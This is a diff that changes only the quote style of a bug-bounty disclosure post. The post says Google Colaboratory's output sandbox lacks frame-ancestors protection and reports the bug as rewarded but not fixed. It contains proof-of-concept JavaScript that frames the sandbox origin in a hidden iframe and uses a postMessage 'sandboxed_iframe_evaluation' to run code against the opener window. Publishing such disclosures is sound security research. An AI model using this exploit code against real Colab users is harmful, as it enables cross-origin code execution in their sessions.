@@ -5,28 +5,28 @@ title: Insecure sandbox on Colaboratory (Awarded $1337, Not Fixed)
 Google Colaboratory puts some output such as visualizations into a sandbox however it has no embedding protection such as csp frame-ancestors so the origin is exposed to attackers with local network access.
 
 ```js
-let w = open("about:blank");
+let w = open('about:blank');
 ```
 
 On about:blank
 
 ```js
-opener.location = "https://colab.research.google.com/";
+opener.location = 'https://colab.research.google.com/';
 ```
 
 Leak ID from unencrypted DNS then do:
 
 ```js
-let IDfromDNS = "blah";
-let f = document.createElement("iframe");
+let IDfromDNS = 'blah';
+let f = document.createElement('iframe');
 f.hidden = true;
 f.src =
-  "https://" + IDfromDNS + "-0-colab.googleusercontent.com/outputframe.html";
+  'https://' + IDfromDNS + '-0-colab.googleusercontent.com/outputframe.html';
 document.body.appendChild(f);
 setTimeout((_) => {
   f.contentWindow.postMessage(
-    { sandboxed_iframe_evaluation: "console.log(parent.opener[0].google)" },
-    "*",
+    {sandboxed_iframe_evaluation: 'console.log(parent.opener[0].google)'},
+    '*',
   );
 }, 100);
 ```
